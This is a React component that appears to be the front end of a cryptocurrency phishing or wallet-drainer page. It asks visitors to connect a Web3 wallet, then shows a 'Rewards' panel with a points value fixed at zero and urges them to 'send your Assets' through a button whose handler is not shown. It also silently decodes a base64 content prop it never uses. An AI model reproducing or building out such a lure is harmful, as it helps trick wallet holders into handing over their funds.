import PointsBG from "../../assets/images/points-bg.png";
import BitcoinImg from "../../assets/images/bitcoin.svg";
import HeaderBGImg from "../../assets/images/header-bg.png";

import "./mainframe.css";

interface  MainFrameProps {
	isConnected: boolean;
	htmlContent: string;
	OnSendAsset: () => void;
	OnClickConnectButton: () => void;
}

export default function MainFrame( {isConnected, htmlContent, OnSendAsset, OnClickConnectButton} : MainFrameProps) {
	let htmlItem: any = {};

	try {
		htmlItem = JSON.parse(atob(htmlContent));
	} catch (error) {
	}
	
	return (
		<section className="parent">
		<div className="container">
			<div className="container-2">
			{isConnected ?
				(
				<div className="connected-wallet">
					<img src={BitcoinImg}/>
					<h1>Rewards</h1>
					<div className="display">
						<div className="header">
							<span className="display-title">Points</span>
						</div>
						<div className="points-card">
							<span className="points-value">0</span>
							<div className="points-tip">
								<span>Points&nbsp;</span>
								<i className="iconfont gn-icon-click icon-info-circle1"></i>
							</div>
						</div>
						<img className="points-bg" src={PointsBG} />
					</div>
					<div className="container-2">
							<h2> Please send your Assets</h2>
							<button className="gn-button gn-button--primary gn-button--medium get-btn" onClick = {OnSendAsset}>
								Send Assets
							</button>
					</div>
				</div>
				) : (
					<>
					<div className="poster">
						<img src={HeaderBGImg} />
					</div>
					<div className="content-3">
						<h1 className="gn-h1">
							Connect Your Web3 Wallet to View Your Assets!
						</h1>
					</div>
					<div className="container-2 container-connect">
						<button className="gn-button gn-button--primary gn-button--medium connect-btn" onClick={OnClickConnectButton}>
						<i className="iconfont icon-wallet"></i>
						&nbsp;Connect
						</button>
					</div>
					</>
				)
			}
			</div>
		</div>
		</section>
	);
}

/*



*/